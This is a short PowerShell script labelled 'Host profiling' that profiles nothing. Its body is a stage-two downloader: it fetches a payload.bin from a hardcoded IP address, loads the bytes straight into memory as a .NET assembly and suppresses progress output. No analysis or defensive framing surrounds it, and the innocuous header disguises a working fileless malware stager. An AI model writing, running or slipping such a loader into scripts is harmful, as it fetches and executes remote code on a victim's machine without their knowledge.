
<# Host profiling #>
[CmdletBinding()]
param(
    [string]$Stage2Url = "https://203.0.113.121/payload.bin"
)
$PayloadBytes = (New-Object System.Net.WebClient).DownloadData($Stage2Url)
[Reflection.Assembly]::Load($PayloadBytes)
$ProgressPreference = "SilentlyContinue"
